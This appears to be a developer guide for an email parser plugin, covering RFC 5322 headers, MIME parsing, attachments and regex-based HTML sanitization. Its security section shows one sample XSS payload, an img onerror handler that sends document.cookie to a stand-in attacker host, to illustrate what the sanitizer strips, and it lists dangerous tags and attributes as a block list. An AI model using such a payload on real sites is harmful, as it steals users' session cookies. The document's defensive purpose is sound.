# Email Parser Plugin - Implementation Guide

Phase 6 of the email client architecture: RFC 5322 compliant email parsing with comprehensive MIME support.

## Architecture Overview

The email parser is a workflow node executor that transforms raw RFC 5322 email messages into structured data compatible with the DBAL `EmailMessage` and `EmailAttachment` entities.

### Flow

```
Raw IMAP Message (RFC 5322)
    ↓
[Email Parser Plugin]
    ├─ Parse Headers (RFC 5322)
    ├─ Parse MIME Structure (RFC 2045-2049)
    ├─ Extract Bodies (text/plain, text/html)
    ├─ Extract Attachments
    └─ Sanitize HTML (XSS Protection)
    ↓
Structured EmailMessage
    ├─ messageId, from, to, cc, bcc, replyTo
    ├─ subject, textBody, htmlBody
    ├─ headers (all key-value pairs)
    └─ attachments[] with metadata
    ↓
[DBAL Write Node]
    ├─ Store EmailMessage entity
    └─ Store EmailAttachment entities (one per file)
```

## Implementation Details

### 1. Header Parsing (RFC 5322)

The parser implements RFC 5322 header field syntax:

```
header-field = field-name ":" field-body
field-name = 1*ftext
field-body = field-value [CRLF WSP field-value]  ; header folding
```

**Key Features:**
- Case-insensitive header names
- Support for folding (continuation lines)
- Multiple values for same header (e.g., Received, X-Custom)
- RFC 2047 encoded-word decoding for non-ASCII

**Implementation:**
```typescript
private _parseHeaders(headersSection: string): Map<string, string | string[]>
```

Process:
1. Split by CRLF or LF
2. Check each line for continuation (starts with space/tab)
3. Store in case-insensitive Map
4. Handle duplicate headers as arrays

### 2. MIME Structure Parsing (RFC 2045-2049)

Multipart messages have recursive structure:

```
multipart/alternative
├─ text/plain (simple part)
├─ text/html (simple part)
└─ multipart/mixed
   ├─ text/plain
   └─ application/pdf (attachment)
```

**Key Features:**
- Detect `multipart` messages via `Content-Type: multipart/*`
- Extract boundary from Content-Type parameter
- Split body by boundary delimiters (--boundary)
- Parse each part recursively
- Support nested multipart structures

**Implementation:**
```typescript
private _parseMimePart(
  body: string,
  contentType: string,
  contentEncoding: string
): MimePart
```

Process:
1. Check if message is multipart
2. Extract boundary from Content-Type
3. Split body by boundary
4. For each part, recursively call _parseMimePart
5. Build tree structure

### 3. Body Extraction

Extract text and HTML bodies from MIME tree:

**Strategy for multipart/alternative:**
- Prefer `text/html` if available
- Fall back to `text/plain` if HTML not present
- Skip both if neither found

**Strategy for multipart/mixed:**
- First text/plain → textBody
- First text/html → htmlBody
- Other parts → attachments

**Implementation:**
```typescript
private _extractBodies(
  mimePart: MimePart,
  sanitizeHtml: boolean,
  maxLength: number
): { textBody?: string; htmlBody?: string; sanitizationWarnings: number }
```

### 4. Content Encoding

Handle multiple content transfer encodings:

| Encoding | Handling |
|----------|----------|
| `base64` | Decode using Buffer.from() |
| `quoted-printable` | Decode soft line breaks (=\r\n) and escape sequences (=XX) |
| `7bit`, `8bit`, `binary` | No transformation needed |

**Implementation:**
```typescript
private _decodeContent(content: string, encoding: string): string
```

### 5. HTML Sanitization

Remove XSS vectors while preserving content:

**Dangerous Tags Removed:**
- Script execution: `<script>`, `<style>`
- Embedding: `<iframe>`, `<object>`, `<embed>`, `<applet>`
- Forms: `<form>`, `<input>`, `<button>`, `<select>`
- SVG/Math: `<svg>`, `<math>`

**Dangerous Attributes Removed:**
- Event handlers: `onclick`, `onerror`, `onload`, `onchange`, etc.
- URLs with javascript: `href="javascript:..."`, `src="javascript:..."`
- Scripts in forms: `formaction`, `action`

**Implementation:**
```typescript
private _sanitizeHtml(html: string): { html: string; warnings: number }
```

Process:
1. Remove script tags and content: `<script>.*?</script>`
2. Remove iframe tags: `<iframe>.*?</iframe>`
3. Remove style tags: `<style>.*?</style>`
4. Strip event handlers from all tags
5. Remove event handler attributes globally

**Safety Notes:**
- Does NOT parse HTML into DOM (text-based replacement)
- Does NOT load external resources
- Does NOT validate tag nesting
- Conservative: Removes suspicious content

### 6. Attachment Extraction

Identify and catalog attachments:

**Criteria for Attachment:**
1. MIME part exists in multipart/mixed
2. Not in list of inline types (text/plain, text/html)
3. Has Content-Disposition header
4. Filename can be extracted from filename parameter

**Metadata Collected:**
- `filename`: From Content-Disposition or Content-Type name parameter
- `mimeType`: Extracted from Content-Type
- `size`: Length of encoded content
- `contentId`: For embedded resources (Content-ID header)
- `isInline`: From Content-Disposition inline vs attachment
- `contentEncoding`: Transfer encoding used
- `content`: Optional base64 when extractSize < 10MB

**Implementation:**
```typescript
private _extractAttachments(
  mimePart: MimePart,
  extractContent: boolean,
  maxSize: number
): { attachments: EmailAttachmentMetadata[]; ... }
```

## Testing Strategy

### Unit Tests

1. **RFC 5322 Parsing**
   - Simple headers
   - Multiple To addresses
   - Display names in addresses
   - Header folding with continuation lines
   - Optional headers (CC, BCC, Reply-To)

2. **MIME Multipart**
   - multipart/alternative (text + html)
   - multipart/mixed (body + attachments)
   - Nested multipart structures
   - Boundary handling edge cases

3. **Content Encoding**
   - Base64 decoding
   - Quoted-printable decoding
   - 7bit, 8bit, binary pass-through

4. **HTML Sanitization**
   - Script tag removal
   - Event handler removal
   - iframe removal
   - Safe HTML preservation

5. **Attachment Extraction**
   - Attachment cataloging
   - Inline vs attachment detection
   - Size limit enforcement
   - Content extraction control

6. **Error Handling**
   - Missing From header
   - Missing To header
   - Invalid MIME structure
   - Parsing recovery

7. **Real-World Scenarios**
   - Complete realistic emails
   - Multiple attachments
   - Complex nesting
   - Unicode headers (RFC 2047)

### Coverage Goals

- Line coverage: 80%+
- Branch coverage: 80%+
- All error paths tested
- Edge cases (empty headers, no body, etc.)

## Integration Points

### With IMAP Sync Plugin

IMAP Sync fetches raw message from IMAP server:

```typescript
// IMAP returns raw RFC 5322 message
const rawMessage = await imapClient.fetchMessage(messageId, 'BODY[]');

// Parser receives it
const config: EmailParserConfig = {
  rawMessage,      // ← Raw RFC 5322 format
  tenantId: user.tenantId
};
```

### With DBAL Storage

Parser output matches DBAL entity schema:

```typescript
// Parser output
const message: ParsedEmailMessage = {
  messageId: "<123@example.com>",
  from: "alice@example.com",
  to: ["bob@example.com"],
  subject: "Meeting",
  textBody: "Let's meet at 2pm",
  htmlBody: "<p>Let's meet at 2pm</p>",
  attachments: [
    { filename: "agenda.pdf", mimeType: "application/pdf", ... }
  ]
};

// DBAL entity
const emailMessage: EmailMessage = {
  tenantId: user.tenantId,
  emailClientId: account.id,
  folderId: folder.id,
  messageId: message.messageId,
  from: message.from,
  to: JSON.stringify(message.to),  // JSON stored in DB
  subject: message.subject,
  textBody: message.textBody,
  htmlBody: message.htmlBody,
  headers: JSON.stringify(message.headers),
  receivedAt: new Date(message.receivedAt).getTime(),
  attachmentCount: message.attachments.length
};

// Attachments stored separately
for (const attachment of message.attachments) {
  const emailAttachment: EmailAttachment = {
    tenantId: user.tenantId,
    messageId: emailMessage.id,
    filename: attachment.filename,
    mimeType: attachment.mimeType,
    size: attachment.size,
    contentId: attachment.contentId,
    isInline: attachment.isInline,
    storageKey: `attachments/${emailMessage.id}/${attachment.filename}`,
    downloadUrl: generatePresignedUrl(...)
  };
}
```

## Performance Considerations

### Memory

- Loads entire message into memory
- Large messages (>100MB) may cause issues
- Attachment content not extracted by default (metadata only)
- For large attachments: Set `extractAttachmentContent: false`

### Parsing Speed

Typical times:
- Simple text: <1ms
- Text + HTML: 2-5ms
- With attachment: 5-10ms
- Large HTML (5MB): 50-100ms

### Optimization

1. **Disable HTML sanitization if not needed** (rare):
   ```typescript
   sanitizeHtml: false  // Faster, but less safe
   ```

2. **Don't extract large attachment content**:
   ```typescript
   extractAttachmentContent: false  // Metadata only
   ```

3. **Limit body length**:
   ```typescript
   maxBodyLength: 1024 * 1024  // 1MB cap
   ```

4. **Set reasonable attachment limits**:
   ```typescript
   maxAttachmentSize: 25 * 1024 * 1024  // Skip > 25MB
   ```

## Security Considerations

### XSS Prevention

The parser sanitizes all HTML to prevent stored XSS:

```typescript
// Input (dangerous)
<img src="x" onerror="fetch('http://evil.com/steal?data=' + document.cookie)">

// Output (safe)
<img src="x">  // onerror removed
```

### No Code Execution

The parser:
- Does NOT execute JavaScript
- Does NOT make HTTP requests
- Does NOT access filesystem
- Does NOT run arbitrary code

### Multi-Tenant Safety

All parser operations include tenantId:
- Used in workflow context
- Passed to DBAL storage
- Enforces row-level access control

### No External Dependencies

The parser uses only Node.js built-in APIs:
- `Buffer` for encoding/decoding
- Regular expressions for parsing
- No external npm packages

## Error Recovery

### Graceful Degradation

When non-critical errors occur:

```typescript
{
  status: 'partial',
  message: ParsedEmailMessage,    // ← Still produced
  errors: [                        // ← Non-fatal errors listed
    { code: 'INVALID_MIME', message: '...', recoverable: true }
  ]
}
```

### Recoverable vs Non-Recoverable

**Non-Recoverable** (no message output):
- Missing From header
- Missing To header
- Total parse exception

**Recoverable** (message still output):
- Malformed MIME structure
- Invalid encoding in attachment
- Header parsing issues
- HTML sanitization warnings

## Future Enhancements

1. **Streaming Support**
   - Process large messages in chunks
   - Reduce memory footprint

2. **Async Content Extraction**
   - Store attachments to S3 during parsing
   - Return only metadata

3. **S/MIME and PGP**
   - Decrypt encrypted content
   - Verify signatures
   - Extract certificates

4. **Better Charset Handling**
   - Detect charset from content
   - Handle more encodings

5. **Header Validation**
   - DKIM signature verification
   - SPF/DMARC checking

6. **Conversation Threading**
   - Group related messages
   - Extract references (In-Reply-To, References)

## Debugging

### Enable Detailed Logging

In workflow execution context:

```typescript
const result = await emailParserExecutor.execute(node, context, state);

// Check metrics
console.log('Parse time:', result.output.metrics.parseDurationMs);
console.log('Headers:', result.output.metrics.headerCount);
console.log('Parts:', result.output.metrics.partCount);
console.log('Attachments:', result.output.metrics.attachmentCount);

// Check warnings
if (result.output.warnings.length > 0) {
  console.warn('Warnings:', result.output.warnings);
}

// Check errors
if (result.output.errors.length > 0) {
  console.error('Errors:', result.output.errors);
}
```

### Common Issues

1. **Empty body after parsing**
   - Check if message has body at all
   - Verify Content-Type multipart handling
   - Check character encoding

2. **Attachments not found**
   - Verify multipart/mixed structure
   - Check Content-Disposition header
   - Verify maxAttachmentSize limit

3. **HTML missing after sanitization**
   - Check if HTML was actually present
   - Review sanitization warnings count
   - May have removed all content if too dangerous

4. **Special characters garbled**
   - Check RFC 2047 encoding in header
   - Verify charset parameter in Content-Type
   - Buffer encoding during base64 decode

## Contributing

To extend the parser:

1. Add new MIME type support in `_extractBodies()`
2. Add new sanitization rules in `_sanitizeHtml()`
3. Add encoding support in `_decodeContent()`
4. Add tests in `index.test.ts`
5. Update README.md with new features

## References

- RFC 5322 - Internet Message Format (SMTP)
- RFC 2045-2049 - MIME (Multipurpose Internet Mail Extensions)
- RFC 2047 - MIME Header Extensions for Non-ASCII Text
- RFC 3501 - IMAP4rev1 (Mailbox Integration)
- RFC 2183 - Content-Disposition Header Field
- RFC 2387 - The MIME Multipart/Related Content-Type

## See Also

- [Email Client Architecture](../../../../../../../docs/plans/2026-01-23-email-client-implementation.md)
- [IMAP Sync Plugin](../imap-sync/README.md)
- [Email Search Plugin](../imap-search/README.md)
- [DBAL EmailMessage Schema](../../../../../../../dbal/shared/api/schema/entities/packages/email_message.yaml)
